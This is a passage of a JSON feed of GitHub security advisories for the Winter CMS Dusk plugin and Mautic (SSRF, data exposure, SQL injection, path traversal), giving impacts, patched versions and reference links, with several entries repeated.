default.</li>\n<li>The application is connectable via the web.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p>Issue has been fixed in v2.1.0.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:hello@wintercms.com\">hello@wintercms.com</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wintercms/wn-dusk-plugin/security/advisories/GHSA-chcp-g9j5-3xxx\">https://github.com/wintercms/wn-dusk-plugin/security/advisories/GHSA-chcp-g9j5-3xxx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32003\">https://nvd.nist.gov/vuln/detail/CVE-2024-32003</a></li>\n<li><a href=\"https://github.com/wintercms/wn-dusk-plugin/blob/main/README.md\">https://github.com/wintercms/wn-dusk-plugin/blob/main/README.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-chcp-g9j5-3xxx\">https://github.com/advisories/GHSA-chcp-g9j5-3xxx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-chcp-g9j5-3xxx",
            "title": "[winter/wn-dusk-plugin] Dusk plugin may allow unfettered user authentication in misconfigured installs",
            "date_modified": "2024-04-15T19:42:00.000Z",
            "date_published": "2024-04-12T21:26:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-chcp-g9j5-3xxx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to the patched version, an authenticated user of Mautic could read system files and access the internal addresses of the application due to a Server-Side Request Forgery (SSRF) vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to 4.4.12 or 5.0.4</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/</a></li>\n</ul>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-mgv8-w49f-822w\">https://github.com/mautic/mautic/security/advisories/GHSA-mgv8-w49f-822w</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/b4b4ab5f0613854152ceb7b5e5228acf50648fd0\">https://github.com/mautic/mautic/commit/b4b4ab5f0613854152ceb7b5e5228acf50648fd0</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/c54befd9eaaa49e4fc10a0fe22435c09ef2821b2\">https://github.com/mautic/mautic/commit/c54befd9eaaa49e4fc10a0fe22435c09ef2821b2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mgv8-w49f-822w\">https://github.com/advisories/GHSA-mgv8-w49f-822w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mgv8-w49f-822w",
            "title": "[mautic/core] Mautic: MST-48  Server-Side Request Forgery in Asset section ",
            "date_modified": "2024-04-12T21:25:19.000Z",
            "date_published": "2024-04-12T21:25:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mgv8-w49f-822w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to the patched version, an authenticated user of Mautic could read system files and access the internal addresses of the application due to a Server-Side Request Forgery (SSRF) vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to 4.4.12 or 5.0.4</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/</a></li>\n</ul>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-mgv8-w49f-822w\">https://github.com/mautic/mautic/security/advisories/GHSA-mgv8-w49f-822w</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/b4b4ab5f0613854152ceb7b5e5228acf50648fd0\">https://github.com/mautic/mautic/commit/b4b4ab5f0613854152ceb7b5e5228acf50648fd0</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/c54befd9eaaa49e4fc10a0fe22435c09ef2821b2\">https://github.com/mautic/mautic/commit/c54befd9eaaa49e4fc10a0fe22435c09ef2821b2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mgv8-w49f-822w\">https://github.com/advisories/GHSA-mgv8-w49f-822w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mgv8-w49f-822w",
            "title": "[mautic/core] Mautic: MST-48  Server-Side Request Forgery in Asset section ",
            "date_modified": "2024-04-12T21:25:19.000Z",
            "date_published": "2024-04-12T21:25:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mgv8-w49f-822w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to the patched version, logged in users of Mautic are able to access areas of the application that they should be prevented from accessing.</p>\n<p>Users could potentially access sensitive data such as names and surnames, company names and stage names.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to 4.4.12 and 5.0.4</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-qjx3-2g35-6hv8\">https://github.com/mautic/mautic/security/advisories/GHSA-qjx3-2g35-6hv8</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/22bdd0796ca6e1e985708b89ad5c07147630fecd\">https://github.com/mautic/mautic/commit/22bdd0796ca6e1e985708b89ad5c07147630fecd</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/2cc4af975fe01c264d439acc1451c936e7114644\">https://github.com/mautic/mautic/commit/2cc4af975fe01c264d439acc1451c936e7114644</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjx3-2g35-6hv8\">https://github.com/advisories/GHSA-qjx3-2g35-6hv8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qjx3-2g35-6hv8",
            "title": "[mautic/core] Mautic Sensitive Data Exposure due to inadequate user permission settings",
            "date_modified": "2024-04-12T17:28:53.000Z",
            "date_published": "2024-04-12T17:28:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qjx3-2g35-6hv8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to the patched version, logged in users of Mautic are able to access areas of the application that they should be prevented from accessing.</p>\n<p>Users could potentially access sensitive data such as names and surnames, company names and stage names.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to 4.4.12 and 5.0.4</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-qjx3-2g35-6hv8\">https://github.com/mautic/mautic/security/advisories/GHSA-qjx3-2g35-6hv8</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/22bdd0796ca6e1e985708b89ad5c07147630fecd\">https://github.com/mautic/mautic/commit/22bdd0796ca6e1e985708b89ad5c07147630fecd</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/2cc4af975fe01c264d439acc1451c936e7114644\">https://github.com/mautic/mautic/commit/2cc4af975fe01c264d439acc1451c936e7114644</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjx3-2g35-6hv8\">https://github.com/advisories/GHSA-qjx3-2g35-6hv8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qjx3-2g35-6hv8",
            "title": "[mautic/core] Mautic Sensitive Data Exposure due to inadequate user permission settings",
            "date_modified": "2024-04-12T17:28:53.000Z",
            "date_published": "2024-04-12T17:28:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qjx3-2g35-6hv8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to the patched version, logged in users of Mautic are vulnerable to an SQL injection vulnerability in the Reports bundle.</p>\n<p>The user could retrieve and alter data like sensitive data, login, and depending on database permission the attacker can manipulate file systems.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to 4.4.12 or 5.0.4</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://owasp.org/www-community/attacks/SQL_Injection\">https://owasp.org/www-community/attacks/SQL_Injection</a></li>\n<li><a href=\"https://owasp.org/www-community/attacks/Blind_SQL_Injection\">https://owasp.org/www-community/attacks/Blind_SQL_Injection</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-jj6w-2cqg-7p94\">https://github.com/mautic/mautic/security/advisories/GHSA-jj6w-2cqg-7p94</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/cab65e0acc4f23c4f07c117dee1b69dac5abed3f\">https://github.com/mautic/mautic/commit/cab65e0acc4f23c4f07c117dee1b69dac5abed3f</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/e75b1eea16309588f069169b5882cf53f854dbd8\">https://github.com/mautic/mautic/commit/e75b1eea16309588f069169b5882cf53f854dbd8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj6w-2cqg-7p94\">https://github.com/advisories/GHSA-jj6w-2cqg-7p94</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj6w-2cqg-7p94",
            "title": "[mautic/core] Mautic SQL Injection in dynamic Reports",
            "date_modified": "2024-04-12T17:25:17.000Z",
            "date_published": "2024-04-12T17:25:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj6w-2cqg-7p94"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to the patched version, logged in users of Mautic are vulnerable to an SQL injection vulnerability in the Reports bundle.</p>\n<p>The user could retrieve and alter data like sensitive data, login, and depending on database permission the attacker can manipulate file systems.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to 4.4.12 or 5.0.4</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://owasp.org/www-community/attacks/SQL_Injection\">https://owasp.org/www-community/attacks/SQL_Injection</a></li>\n<li><a href=\"https://owasp.org/www-community/attacks/Blind_SQL_Injection\">https://owasp.org/www-community/attacks/Blind_SQL_Injection</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-jj6w-2cqg-7p94\">https://github.com/mautic/mautic/security/advisories/GHSA-jj6w-2cqg-7p94</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/cab65e0acc4f23c4f07c117dee1b69dac5abed3f\">https://github.com/mautic/mautic/commit/cab65e0acc4f23c4f07c117dee1b69dac5abed3f</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/e75b1eea16309588f069169b5882cf53f854dbd8\">https://github.com/mautic/mautic/commit/e75b1eea16309588f069169b5882cf53f854dbd8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj6w-2cqg-7p94\">https://github.com/advisories/GHSA-jj6w-2cqg-7p94</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj6w-2cqg-7p94",
            "title": "[mautic/core] Mautic SQL Injection in dynamic Reports",
            "date_modified": "2024-04-12T17:25:17.000Z",
            "date_published": "2024-04-12T17:25:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj6w-2cqg-7p94"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Prior to the patched version, logged in users of Mautic are vulnerable to Relative Path Traversal/Arbitrary File Deletion.  Regardless of the level of access the Mautic user had, they could delete files other than those in the media folders such as system files, libraries or other important files.</p>\n<p>This vulnerability exists in the implementation of the GrapesJS builder in Mautic.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to 4.4.12 or 5.0.4.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/23.html\">https://cwe.mitre.org/data/definitions/23.html</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/22.html\">https://cwe.mitre.org/data/definitions/22.html</a></li>\n<li><a href=\"https://attack.mitre.org/techniques/T1630/002/\">https://attack.mitre.org/techniques/T1630/002/</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:security@mautic.org\">security@mautic.org</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mautic/mautic/security/advisories/GHSA-9fcx-cv56-w58p\">https://github.com/mautic/mautic/security/advisories/GHSA-9fcx-cv56-w58p</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/546045ff9c74dd8b3dac36c4ab3674380262c65a\">https://github.com/mautic/mautic/commit/546045ff9c74dd8b3dac36c4ab3674380262c65a</a></li>\n<li><a href=\"https://github.com/mautic/mautic/commit/95e8df3ae6730c725f1848d70e7992da369518f3\">https://github.com/mautic/mautic/commit/95e8df3ae6730c725f1848d70e7992da369518f3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fcx-cv56-w58p\">https://github.com/advisories/GHSA-9fcx-cv56-w58p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fcx-cv56-w58p",
            "title": "[mautic/core] Mautic vulnerable to Relative Path Traversal / Arbitrary File Deletion due to GrapesJS builder",
            "date_modified": "2024-04-12T17:07:16.000Z",
            "date_published": "2024-04-12T17:07:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fcx-cv56-w58p"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}